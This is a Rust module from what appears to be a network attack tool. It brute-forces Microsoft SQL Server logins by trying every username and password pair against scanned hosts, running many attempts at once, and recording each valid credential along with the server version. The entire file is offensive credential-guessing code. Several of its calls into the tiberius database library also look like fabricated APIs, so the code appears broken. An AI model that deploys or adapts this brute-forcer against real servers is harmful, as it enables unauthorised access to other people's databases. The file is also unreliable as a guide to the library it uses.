// src/brute/mssql.rs
use std::net::IpAddr;
use std::time::Duration;
use tokio::sync::mpsc;
use tokio::time::timeout;
use log::{debug, info, error};
use crate::common::utils;
use crate::scanner::ServiceInfo;
use crate::brute::BruteResult;

pub async fn brute_force(
    services: &[&ServiceInfo],
    usernames: &[String],
    passwords: &[String],
    timeout_secs: u64,
    threads: usize,
) -> Result<Vec<BruteResult>, Box<dyn std::error::Error>> {
    if services.is_empty() || usernames.is_empty() || passwords.is_empty() {
        return Ok(Vec::new());
    }
    
    info!("Starting MSSQL brute force for {} services with {} usernames and {} passwords...", 
        services.len(), usernames.len(), passwords.len());
    
    // 计算总尝试次数
    let total_attempts = services.len() * usernames.len() * passwords.len();
    let pb = utils::create_progress_bar(total_attempts as u64, "MSSQL brute force");
    
    let (tx, mut rx) = mpsc::channel(threads);
    let timeout_duration = Duration::from_secs(timeout_secs);
    
    // 创建所有组合的任务
    let mut tasks = Vec::new();
    for service in services {
        for username in usernames {
            for password in passwords {
                tasks.push((
                    service.ip,
                    service.port,
                    username.clone(),
                    password.clone(),
                ));
            }
        }
    }
    
    // 分块处理
    let chunk_size = (tasks.len() + threads - 1) / threads;
    let chunks: Vec<Vec<(IpAddr, u16, String, String)>> = tasks
        .chunks(chunk_size)
        .map(|chunk| chunk.to_vec())
        .collect();
    
    for chunk in chunks {
        let tx = tx.clone();
        let timeout_duration = timeout_duration;
        let pb = pb.clone();
        
        tokio::spawn(async move {
            for (ip, port, username, password) in chunk {
                if let Some(result) = try_mssql_login(
                    ip,
                    port,
                    &username,
                    &password,
                    timeout_duration
                ).await {
                    let _ = tx.send(result).await;
                }
                pb.inc(1);
            }
        });
    }
    
    // 丢弃原始发送者
    drop(tx);
    
    // 收集结果
    let mut results = Vec::new();
    while let Some(result) = rx.recv().await {
        results.push(result);
    }
    
    pb.finish_with_message(format!("Found {} valid MSSQL credentials", results.len()));
    
    Ok(results)
}

async fn try_mssql_login(
    ip: IpAddr,
    port: u16,
    username: &str,
    password: &str,
    timeout_duration: Duration,
) -> Option<BruteResult> {
    // MSSQL连接是复杂的TDS协议，这里我们使用blocking任务执行
    let ip_str = ip.to_string();
    let username_clone = username.to_string();
    let password_clone = password.to_string();
    
    let result = tokio::task::spawn_blocking(move || {
        // 构建连接字符串
        let conn_str = format!(
            "server={},{}; user={}; password={}; encrypt=false; TrustServerCertificate=true; connection timeout=5", 
            ip_str, 
            port, 
            username_clone, 
            password_clone
        );
        
        // 尝试连接
        match tiberius::SqlBrowser::local_server_and_instance() {
            Ok(_) => {
                // 配置客户端
                let mut config = tiberius::Config::from_ado_string(&conn_str).unwrap();
                
                // 尝试创建连接（同步版本）
                let tcp = std::net::TcpStream::connect((ip_str.as_str(), port));
                if let Ok(tcp) = tcp {
                    tcp.set_nodelay(true).unwrap();
                    tcp.set_read_timeout(Some(std::time::Duration::from_secs(5))).unwrap();
                    tcp.set_write_timeout(Some(std::time::Duration::from_secs(5))).unwrap();
                    
                    let mut client = match tiberius::Client::connect(config, tcp) {
                        Ok(client) => client,
                        Err(_) => return None,
                    };
                    
                    // 尝试执行一个简单的查询
                    match client.simple_query("SELECT @@VERSION").blocking_execute() {
                        Ok(rows) => {
                            let mut version = String::new();
                            for row_result in rows {
                                if let Ok(row) = row_result {
                                    if let Some(tiberius::Row::Data(data)) = row {
                                        if !data.values.is_empty() {
                                            if let tiberius::ColumnData::String(Some(v)) = &data.values[0] {
                                                version = v.to_string();
                                                break;
                                            }
                                        }
                                    }
                                }
                            }
                            
                            let details = if !version.is_empty() {
                                Some(format!("MSSQL version: {}", version))
                            } else {
                                Some("MSSQL authentication successful".to_string())
                            };
                            
                            Some(BruteResult {
                                ip,
                                port,
                                service: "mssql".to_string(),
                                username: username_clone,
                                password: password_clone,
                                details,
                            })
                        },
                        Err(_) => None,
                    }
                } else {
                    None
                }
            },
            Err(_) => None,
        }
    });
    
    match timeout(timeout_duration, result).await {
        Ok(Ok(result)) => result,
        _ => None,
    }
}
